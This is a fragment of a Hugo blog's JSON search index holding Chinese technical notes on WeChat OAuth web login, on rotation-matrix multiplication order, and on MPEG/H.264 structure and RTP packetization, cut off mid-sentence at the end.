    "content": "订阅号与服务号的区别 https://developers.weixin.qq.com/doc/offiaccount/Getting_Started/Explanation_of_interface_privileges.html\n订阅号侧重向用户推送文章，服务号侧重对用户做服务（交易等）但发送文章很少\n网页开发 机制：网页授权 场景：在微信中打开第三方网页，可以用网页授权机制获取用户信息\nscope\nsnsapi_base: 获取进入页面的用户 openid（静默授权） snsapi_userinfo: 获取进入页面的用户基本信息，需要用户手动同意，无需用户关注 网页获取用户信息 scope snsapi_base snsapi_userinfo https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID\u0026amp;redirect_uri=REDIRECT_URI\u0026amp;response_type=code\u0026amp;scope=SCOPE\u0026amp;state=STATE#wechat_redirect https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx90348171d6a27b83\u0026amp;redirect_uri=REDIRECT_URI\u0026amp;response_type=code\u0026amp;scope=SCOPE\u0026amp;state=STATE#wechat_redirect\n通过网页页面获取用户信息的方法：\n引导用户点击带 redirect_uri 的内容（比如，通过菜单设置: https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx90348171d6a27b83\u0026amp;redirect_uri=REDIRECT_URI\u0026amp;response_type=code\u0026amp;scope=SCOPE\u0026amp;state=STATE#wechat_redirect） 用户点击后经过腾讯 oauth2 回调到 redirect_uri，并且带有 \u0026lsquo;code\u0026rsquo; 参数 页面处理 code 信息，例如将 code 作为一个参数带入调用后端的 API 接口 后端调用腾讯 sns/userinfo 接口获取用户信息 首先调用 https://api.weixin.qq.com/sns/oauth2/access_token 获取 access token 再调用 https://api.weixin.qq.com/sns/userinfo 获取用户信息 weixin 与手机号绑定\n引导用户进入带oauth2回调页面，获取用户 code 使用 code 检查用户信息 如果已经存在用户，则返回 token 并正常打开 next 页面 如果不存在，则进入注册信息绑定页面，绑定手机号（短信验证） 验证通过后，创建用户并返回 token 并正常打开 next 页面 网站实现扫码登陆方法： https://developers.weixin.qq.com/doc/oplatform/Website_App/WeChat_Login/Wechat_Login.html\n步骤1：嵌入下面 JS 文件 http://res.wx.qq.com/connect/zh_CN/htmledition/js/wxLogin.js 步骤2：在需要使用微信登录的地方实例以下JS对象： var obj = new WxLogin({ self_redirect:true, id:\u0026#34;login_container\u0026#34;, appid: \u0026#34;\u0026#34;, scope: \u0026#34;\u0026#34;, redirect_uri: \u0026#34;\u0026#34;, state: \u0026#34;\u0026#34;, style: \u0026#34;\u0026#34;, href: \u0026#34;\u0026#34; }); 业务域名\n", 
    "url": "http:\/\/localhost:1313\/post\/wechat_development\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/rotation\/": {
        
        "title": "Rotation",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/rotation\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/rotation_matrix\/": {
        
        "title": "Rotation_matrix",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/rotation_matrix\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E5%8F%B3%E4%B9%98\/": {
        
        "title": "右乘",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E5%8F%B3%E4%B9%98\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E5%B7%A6%E4%B9%98\/": {
        
        "title": "左乘",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E5%B7%A6%E4%B9%98\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/robotics\/left_right_rotation\/": {
        
        "title": "左乘\/右乘旋转",
            "tags": [ "rotation",  "rotation_matrix",  "旋转矩阵",  "左乘",  "右乘", ],
    "content": "左乘旋转 左乘对应的物理转动为绕固定坐标轴旋转\n下图表示的是左乘 $R_z(\\alpha) R_y(\\beta) R_x(\\gamma)$\n对应的旋转为：\n绕固定坐标系 X 轴旋转 $\\gamma$ 绕固定坐标系 Y 轴旋转 $\\beta$ 绕固定坐标系 Z 轴旋转 $\\alpha$ 右乘旋转 绕自身坐标系旋转\n下图对应的是右乘 $R_z(\\alpha) R_y(\\beta) R_x(\\gamma)$\n对应的旋转为：\n绕 Z 轴旋转 $\\alpha$ 绕旋转后得到的坐标系 Y 轴旋转 $\\beta$ 绕旋转后得到的坐标系 X 轴旋转 $\\gamma$ ", 
    "url": "http:\/\/localhost:1313\/post\/robotics\/left_right_rotation\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5\/": {
        
        "title": "旋转矩阵",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/cv\/": {
        
        "title": "Computer Vision",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/cv\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/h.264\/": {
        
        "title": "H.264",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/h.264\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/mp4\/": {
        
        "title": "MP4",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/mp4\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/mpeg\/": {
        
        "title": "MPEG",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/mpeg\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/mpeg-4\/": {
        
        "title": "MPEG-4",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/mpeg-4\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/multimedia\/": {
        
        "title": "Multimedia",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/multimedia\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/rtp\/": {
        
        "title": "RTP",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/rtp\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/video\/": {
        
        "title": "Video",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/video\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/cv\/video-media-container\/": {
        
        "title": "多媒体格式标准、H264 编码与 MP4 格式简要介绍",
            "tags": [ "MPEG-4",  "MP4",  "RTP",  "H.264", ],
    "content": "1.标准概括 1.1.MPEG-1 主要用于 CD / VCD 光盘时代的音视频压缩。\nMPEG-1可以按照分层的概念来理解，一个MPEG-1视频编码序列分为三个层次，从顶层到最底层依次是：\n图像组层（GOP: Group of Picture） 帧层（frame），每个 GOP 可以包含多个 frame 像条层（slice），每个 frame 可以包含多个 slice MPEG-1 定义的帧种类：\nI-图像／帧（节点编码图像，intra coded picture）参考图像，相当于一个固定影像，且独立于其它的图像类型。每个图像组群由此类型的图像开始。编码时独立编码，仅适用帧内编码技术，因而解码时不参考其他帧，类似JPEG编码。 P-图像／帧（预测编码图像，predictive coded picture）包含来自先前的I或P-画格的差异信息。编码时使用运动补偿和运动估计，采用前向估计，参考之前的I-帧或者P-帧去预测该P格。 B-图像／帧（前后预测编码图像，bidirectionally predictive coded pictures）包含来自先前和／或之后的I或 P-画格的差异信息。编码也使用运动补偿和运动估计，预估采用前向估计、后向估计或是双向估计，主要参考前面的或者后面的I格或者P格。 D-图像／帧（指示编码图像，DC direct coded picture）用于快速进带。仅由DC直流分量构造的图像，可在低比特率的时候做浏览用。实际编码中很少使用。 1.2.MPEG-2 MPEG-2 是 DVD 和数字电视广播时代产生的音视频编码标准，但也被应用于后来的高清电视（HDTV）和蓝光光盘。\nMPEG-2 的编码码流分为六个层次，从顶层到最底层依次是：\n视频序列层（Sequence） 图像组层（GOP: Group of Picture） 图像层（Picture） 像条层（Slice） 宏块层（Macro Block） 像块层（Block） 1.3.MPEG-3 MPEG-3是MPEG组织制定的视频和音频压缩标准。本来的目标是为HDTV提供20-40Mbps视频压缩技术。在标准制定的过程中，委员会很快发现MPEG-2技术足以获取类似的效果，因此将其合并到MPEG-2，成为MPEG-2的延伸。\nMP3 vs MPEG-3 MP3 是 MPEG-1 音频 Layer-3 部分，MPEG-1 的音频格式有 3 代，MP3 是第三代。\nMPEG-3 是音视频标准，目前已经属于 MPEG-2 的一部分。\n1.4. MPEG-4 MPEG-4 是由一系列标准组成\n第一部分（ISO/IEC 14496-1）：系统：描述视频和音频数据流的控制、同步以及混合方式（即混流Multiplexing，简写为MUX）。\n第二部分（ISO/IEC 14496-2）：视频：定义一个对各种视觉信息（包括自然视频、静止纹理、计算机合成图形等等）的编解码器。（例如XviD编码就属于MPEG-4 Part 2）\n第三部分（ISO/IEC 14496-3）：音频：定义一个对各种音频信号进行编码的编解码器的集合。包括高级音频编码（Advanced Audio Coding，缩写为AAC）的若干变形和其他一些音频/语音编码工具(如Audio Lossless Coding,缩写为ALS)。\n第四部分（ISO/IEC 14496-4）：一致性：定义对本标准其他的部分进行一致性测试的程序。\n第五部分（ISO/IEC 14496-5）：参考软件：提供用于演示功能和说明本标准其他部分功能的软件。\n第六部分（ISO/IEC 14496-6）：多媒体传输集成框架（DMIF for Delivery Multimedia Integration Framework）\n第七部分（ISO/IEC 14496-7）：优化的参考软件：提供对实现进行优化的例子（这里的实现指的是第五部分）。\n第八部分（ISO/IEC 14496-8）：在IP网络上传输：定义在IP网络上传输MPEG-4内容的方式。\n第九部分（ISO/IEC 14496-9）：参考硬件：提供用于演示怎样在硬件上实现本标准其他部分功能的硬件设计方案。\n第十部分（ISO/IEC 14496-10）：高级视频编码或称高级视频编码（Advanced Video Coding，缩写为AVC）：定义一个视频编解码器（codec）。AVC和XviD都属于MPEG-4编码，但由于AVC属于MPEG-4 Part 10，在技术特性上比属于MPEG-4 Part2的XviD要先进。另外，它和ITU-T H.264标准是一致的，故又称为H.264。\n第十二部分（ISO/IEC 14496-12）：基于ISO的媒体文件格式：定义一个存储媒体内容的文件格式。\n第十三部分（ISO/IEC 14496-13）：知识产权管理和保护（IPMP for Intellectual Property Management and Protection）拓展。\n第十四部分（ISO/IEC 14496-14）：MPEG-4（即MP4）文件格式：定义基于第十二部分的用于存储MPEG-4内容的视频文档格式。\n第十五部分（ISO/IEC 14496-15）：AVC文件格式：定义基于第十二部分的用于存储第十部分的视频内容的文件格式。\n第十六部分（ISO/IEC 14496-16）：动画框架扩展（AFX : Animation Framework eXtension）。\n第十七部分（ISO/IEC 14496-17）：同步文本字幕格式。\n第十八部分（ISO/IEC 14496-18）：字体压缩和流式传输（针对开放字体格式Open Font Format）。\n第十九部分（ISO/IEC 14496-19）：合成材质流（Synthesized Texture Stream）。\n第二十部分（ISO/IEC 14496-20）：简单场景表示（LASeR for Lightweight Scene Representation。\n第二十一部分（ISO/IEC 14496-21）：用于描绘（Rendering）的MPEG-J拓展。\n第二十二部分（ISO/IEC 14496-22）：开放字体格式（Open Font Format）。\n第二十三部分（ISO/IEC 14496-23）：符号化音乐表示（Symbolic Music Representation）。\n第二十四部分（ISO/IEC 14496-24）：音频与系统交互作用（Audio and systems interaction）。\n第二十五部分（ISO/IEC 14496-25）：3D图形压缩模型（3D Graphics Compression Model）。\n第二十六部分（ISO/IEC 14496-26）：音频一致性检查：定义测试音频数据与ISO/IEC 14496-3是否一致的方法（Audio conformance）。\n第二十七部分（ISO/IEC 14496-27）：3D图形一致性检查：定义测试3D图形数据与ISO/IEC 14496-11:2005, ISO/IEC 14496-16:2006, ISO/IEC 14\n几个重点：\n音视频编码：第二部分（ISO/IEC 14496-2）/第三部分（ISO/IEC 14496-3）（MPEG4 编码）、第十部分（ISO/IEC 14496-10）(H.264) 网络传输：第八部分（ISO/IEC 14496-8） MP4文件格式：第十四部分（ISO/IEC 14496-14） 1.4.1.MP4 vs MPEG-4 MP4或称MPEG-4第14部分（英语：MPEG-4 Part 14）是一种标准的数字多媒体容器格式。MPEG-4第14部分的扩展名为.mp4，以存储数字音频及数字视频为主，但也可以存储字幕和静止图像。因其可容纳支持比特流的视频流（如高级视频编码），为流媒体。\nMPEG-4 是一系列用来定义音频、视频的标准集\n1.5.视频编码标准的演变 H.261: 视频电话 MPEG-1: VCD H.262: 数字电视 / DVD H.263/H.263+/H.263++：通讯类应用，如视频会议，支持多种网络（PSTN, mobile, LAN/Internet），对丢包/出错场景的兼容性更高 MPEG-4：基于目标编码，形状编码 H.264 / AVC Coding：多种使用场景，有线/无线广播、DVD/蓝光存储、视频会议、流式多媒体、多媒体消息（MMS）。因此支持各种读取方式支持顺序/随机，高/低比特率，高/低网络延迟，高/低丢包等情景。 2.H.264.第十部分（ISO/IEC 14496-10） 2.1.架构 分层设计:\nNetwork Abstraction Layer (NAL)：视频和 metadata 格式化进行各种网络适配 Video Coding Layer (VCL)：视频编码层 主要步骤：\n压缩：预测（帧内预测/帧间预测），DCT转换和量化，比特流编码，结果是编码的 Macroblock 切分数据：分片，切分 封装：包装 NAL 2.2. NAL 主要目标定义如何把视频数据在不同的网络上进行传输\nRTP/IP：互联网广播 MPEG-2：广播服务流 ISO 文件：存储应用（光盘） NALU 按内容进行分类：\nVCL unit：视频图像 头信息块（A类）：包括宏块类型，量化参数，运动矢量 帧内编码信息块（B类）：包含帧内编码宏块类型，帧内编码系数 帧间编码信息块（C类）：包含帧间编码宏块类型，帧间编码系数 Non-VCL unit：metadata 等信息 Parameter sets：被 VCL NAL units 共享的数据头信息 picture parameter set (PPS): 图像参数集，PPS对如熵编码类型、有效参考图像的数目、初始化量化参数、去方块滤波系数等解码参数进行标志记录。一个 VCL 包含一个自己的 picture parameter set 指向对应 PPS Non-VCL unit 的指针。 sequence parameter set (SPS): 序列参数集，SPS对如标识符、帧数以及参考帧数目、解码图像尺寸和帧场模式等解码参数进行标识记录。每个 picture parameter set 指向 sequence parameter set Supplemental Enhancement Info (SEI)：用于提高播放质量（rate-distortion等），非必需的，扩展性强（应用程序可扩展） NALU 传输分类：\n基于流（stream-oriented）：需要使用 Start Code prefix (00 00 00 01 或 00 00 01) 基于包（packet-oriented）：不需要使用 Start Code prefix 编码： H.264 NALU 单元常由[Start Code] [NALU Header] [NALU Payload] 三部分组成\nStart Code: 表示 NALU 开始，必须是 00 00 00 01 或 00 00 01 NALU Header：1 个字节 NALU Payload：内容 访问（Access Units）：\n一组可以解码成图像的 NALU 被称为 Access Units\nDelimiter: 定位 SEI：时间和其他信息 Primary coded picture: VCL Redundant coded picture：主码解码错误后进行错误修复 2.3. VCL 2.3.1.图像表示方法概念 宏块 Macroblock(MB):\n亮度宏块（luma）：大小 16x16，1个 色差宏块（chroma）：大小 8x8，2个，与 primary colors 的色差分量 Cb, Cr。 片（slice）：\nslice是 一组 MB 构成的集合，一个 slice 可以不需要别的 slice 参与进行独立解码，可以分为以下几类：\nI-slice: 帧内预测 (I-MB) P-slice: 帧间预测 (I- and P-MBs) B-slice: 双向帧间预测 (I- and B-MBs) SP-slice: 在不同码流间切换 SI-slice: 与 SP-slice 一起在不同码流间切换 灵活的宏块顺序 (Flexible Macroblock Order - FMO)：\n在 slice 内部 macroblock 按照栅格顺序排列 slice group：包含一个或多个 slice 图像（Picture）:\n一个图像通常对应一帧(Frame)或两场(Field)\n帧（Frame）:\n一个帧包含 1 个亮度分量和 2 个色差分量\n分类：\nI帧(Intra coded frame/关键帧) 普通 I 帧：所有 MB 采用帧内预测方式，仅用 I 帧就可以解码出完整图像 作为P帧/B帧的参考帧 可以作为快进/快退的参考点 IDR 帧：立即刷新图像缓冲区，从 IDR 可以重新开始一个序列（Sequence），IDR 之后的 P帧/B帧都不能参考之前的帧 主要用于随机播放 P帧：前向预测帧间编码帧，参考前面靠近的 I 帧和 P 帧 P 帧可以作为后续 P 帧的参考帧（如果中间出现错误会传递扩大） B帧：双向预测帧间编码帧，参考前面靠近的 I 帧和 P 帧和后面的 P 帧 在更早的标准中（如 MPEG-2）不作为参考帧 在 H.264 中可以作为参考帧 SI帧：用于不同编码流之间的切换 SP帧：用于不同编码流之间的切换 “帧”与“片”与“宏块”\n帧/片类型 宏块 I frames/slices (Intra) I宏块 P frames/slices (Predicted) I宏块、P宏块 B frames/slices (Bi-Predicted) I宏块、B宏块 SI-frames/slices (switching I) SI宏块（一种特殊的帧内编码宏块），用于不同编码流之间的切换 SP-frames/slices (switching P) I宏块、P宏块，用于不同编码流之间的切换 场/帧场（Field）:\n帧内交替行（奇偶行）的集合，一个帧由顶场(Top Field)/底场(Bottom Field)组成，每个场可以在不同的时间拍摄（Interlaced）\nTop field\tTop field Bottom field\tBottom field ^ ^ | frame | ^ ^ | frame | Field 编码成 Frame 有几种方式：\nframe mode: 只用单个 frame field mode: 2 个 field 组成一个 frame mixed mode (adaptive): 自适应的决定使用 frame mode 或 field mode 自适应 (adaptive mode) 可以分两种：\nPAFF (Picture-Adaptive frame/field) 在 frame 级别进行判定使用 frame / field mode 比使用 frame mode 提高 16-20% 压缩率 MBAFF (Macroblock-adaptive frame/field) 在 MB 级别进行判定使用 frame / field mode 比 PAFF 进一步提高 14-16% 压缩率 **题外话：**过去的阴极射线电视机在帧率接近电影的帧率时图像会过快消失，所以采用隔行扫描形式组成 1 帧，同时可以降低数据带宽。\n2.3.2.帧内预测 (Intra-frame Prediction) 使用一个 MB 左边及上边的 MB 进行预测。\n预测类型：\nIntra_4x4: detailed luma blocks Intra_16x16: smoothed luma blocks Chroma_8x8: 色差比较平滑 I_PCM: 忽略 prediction/transform，适用于不规则的图像、或者无损的图像、或者需要进行确定性 bit-rate 的场景 2.3.2.1.Intra_4x4 预测模式：\n1 个 DC 模式 8 个方向模式 2.3.2.2.Intra_16x16 预测模式：\nVertical Horizontal DC Planar (Diagonal) 2.3.3.Inter-Prediction in P slices 2.3.3.1.切分 MB 按照亮度和色差切分\n2.3.4.Multiframe Inter-Prediction in B slices 2.4.码流结构 经过 VCL 编码后生成的 NALU 原始数据会被分包，因为 NALU 的 Start Code 是 00 00 00 01 或 00 00 01，因此在 NALU 数据中也可能存在冲突，解决办法是引入 EBSP\n几个概念：\nSODB：String of Data Bits，原始数据比特流，是最原始的编码压缩后的数据 RBSP：Raw Byte Sequence Payload，原始字节序列载荷，对 SODB 进行 8 位补齐 RBSP = SODB + RBSP Trailing Bits EBSP：Encapsulated Byte Sequence Payload，扩展字节序列载荷，在 RBSP 中引入防竞争字节（0x03），在 RBSP 中如果出现了连续两个 00 字节，就在后面添加一个防竞争字节（0x03） 2.5.Profiles and Applications 主要目的是定义编码工具和算法\n3 个 Profile:\nBaseline: 主要用于视频会议 Main: 广播、媒体存储、数字影院 Extended: IP 网络流媒体 3.网络传输: 第八部分（ISO/IEC 14496-8） 这个标准定义了以下内容：\n在 IP 网络上传输 ISO/IEC 14496 内容的框架 在 RTP 中分片/组装负载的指导方法 使用 SDP (Session description protocol) 传输 ISO/IEC 14496-1 内容 ISO/IEC14496 相关的 MIME type RTP 安全和多播 3.1. RTP RTP 负载分片/组装规则\n3.1.1. RTP 传输 H.264 H.264 NALU H.264 NALU 单元常由[Start Code] [NALU Header] [NALU Payload] 三部分组成\nStart Code: 表示 NALU 开始，必须是 00 00 00 01 或 00 00 01 NALU Header：1 个字节 NALU Payload：内容 NALU (Header + Payload) 一个 NALU 的封装形式如下，包含了 NALU Header 及 NALU Payload\n0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |F|NRI| type | | +-+-+-+-+-+-+-+-+ | | | | Bytes 2..n of a Single NAL unit | | | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | :...OPTIONAL RTP padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ NALU Header： +---------------+ |0|1|2|3|4|5|6|7| +-+-+-+-+-+-+-+-+ |F|NRI| Type | +---------------+ F: 1 bit forbidden_zero_bit，h264语法规定值为0。rtp封包中，当检测到值为1时，则表示该nalu中已出现错误。\nNRI: 2 bits nal_ref_idc, 参考级别，当值为00时，表示后面的负载可以丢弃，并不会影响正常解码，当大于00时后面的该包丢弃会影响解码，不可丢弃。rtp封包中，该值也表示该数据包的重要性，11为重要性最高。\nType: 5 bits\nnal_unit_type，nalu的类型，h264文档中定义为\nnal_unit_type 含义 0 未定义 1 非IDR图像中不采用数据划分的片段 2 非IDR图像中A类数据划分片段 3 非IDR图像中B类数据划分片段 4 非IDR图像中C类数据划分片段 5 IDR图像的片段 6 补充增强信息 (SEI) 7 序列参数集/SPS 8 图像参数集/PPS 9 分割符 10 序列结束符 11 流结束符 12 填充数据 13 – 23 保留 24 – 31 未定义 1-23 是 H.264 的标准定义，24 以后 RTP 进行了专有扩展\nType Packet Single NAL Non-Interleaved Interleaved Unit Mode Mode Mode ------------------------------------------------------------- 0 undefined ig ig ig 1-23 NAL unit yes yes no 24 STAP-A no yes no 25 STAP-B no no yes 26 MTAP16 no no yes 27 MTAP24 no no yes 28 FU-A no yes yes 29 FU-B no no yes 30-31 undefined ig ig ig 1-23 单一时间数据包 (Single NAL unit packet)，一个rtp包中只包含一个nalu。\n24-25 单一时间组合包(Aggregation packet)，一个rtp包含多个同一时间nalu。\n26-27 多时间组合包(Aggregation packet)，一个rtp包含多个时间片的多个nalu。\n28-29 分片组合(Fragmentation unit)，多个rtp包才能组合成一个完整的nalu。\n#####打包封装:\n使用 RTP 打包时会用 RTP 头替换掉 NALU 中开始的 Start Code (00 00 00 01 或 00 00 01)\n打包举例，对于如下 NALU\n[00 00 00 01 67 42 A0 1E 23 56 0E 2F … ] 使用 RTP 打包成下面的内容：\n[RTP Header] [67 42 A0 1E 23 56 0E 2F … ] 几种情况：\nSingle NAL unit packet：可以在一个网络包中传输整个 NALU Aggregation packet：可以在一个网络包中传输多个 NALU，又可以分为“单一时间组合包”和“多时间组合包” Fragmentation unit：无法在一个网络包中传输整个 NALU，可以理解成一个 NALU 长度超过 MTU 减去各种协议头（UDP/TCP/IP/RTP）的长度，需要把一个 NALU 拆分成多个 NAL 单一时间数据包：\n当nalu较小，一个rtp包即可传输时，可在单个rtp包中只包含一个nalu，进行发送。\n一个rtp中只包含一个nalu，rtp的负载如下\n0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | RTP Header | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |F|NRI| type | | +-+-+-+-+-+-+-+-+ | | | | Bytes 2..n of a Single NAL unit | | | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | :...OPTIONAL RTP padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 单一时间组合包：\nnalu较小的情况下，在同一时刻生成了多个nalu，可以使用该打包方式，将多个nalu封装在一个包中。webrtc中sps和pps通常打包在同一个rtp中。\nSTAP-A 封装格式\n0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | RTP Header | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |STAP-A NAL HDR | NALU 1 Size | NALU 1 HDR | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NALU 1 Data | : : + +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | NALU 2 Size | NALU 2 HDR | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NALU 2 Data | : : | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | :...OPTIONAL RTP padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ STAP-A NAL HDR 中 nalu type取值为24。\n相对于单一数据包中，多了一个 NALU Size 字段，表示每个nalu的长度。\nSTAP-B 封装格式\n0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | RTP Header | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |STAP-B NAL HDR | DON | NALU 1 Size | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NALU 1 Size | NALU 1 HDR | NALU 1 Data | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ + : : + +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | NALU 2 Size | NALU 2 HDR | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NALU 2 Data | : : | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | :...OPTIONAL RTP padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ STAP-B NAL HDR 中 nalu type取值为25。\n相对于STAP-A多了一个DON (decoding order number)字段，既解码顺序，而后续的每个nalu的解码顺序为DON累加1，既nalu 1 解码顺序为DON,而NALU2 为DON+1,NALU3 为(DON +1)+1，以此类推。\n多时间组合包：\nnalu较小的情况下，在一个rtp包中封装多个不同时间戳的nalu。\nMTAP16\n0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | RTP Header | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |MTAP16 NAL HDR | decoding order number base | NALU 1 Size | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NALU 1 Size | NALU 1 DOND | NALU 1 TS offset | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NALU 1 HDR | NALU 1 DATA | +-+-+-+-+-+-+-+-+ + : : + +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | NALU 2 SIZE | NALU 2 DOND | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NALU 2 TS offset | NALU 2 HDR | NALU 2 DATA | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | : : | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | :...OPTIONAL RTP padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ MTAP16 NAL HDR 中 nalu type取值为26。\nDONB(decoding order number base)表示解码顺序的基数值，DOND 表示与DONB的偏移值。\nNALU TS offset ，为nalu原始时间戳与 rtp包头中的timestap的偏移值。\nMTAP24\n0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | RTP Header | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |MTAP24 NAL HDR | decoding order number base | NALU 1 Size | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NALU 1 Size | NALU 1 DOND | NALU 1 TS offs | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |NALU 1 TS offs | NALU 1 HDR | NALU 1 DATA | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ + : : + +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | NALU 2 SIZE | NALU 2 DOND | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NALU 2 TS offset | NALU 2 HDR | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NALU 2 DATA | : : | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | :...OPTIONAL RTP padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ MTAP24 NAL HDR 中 nalu type取值为27。\nMATP16与 MTAP24 的区别在于NALU TS offset 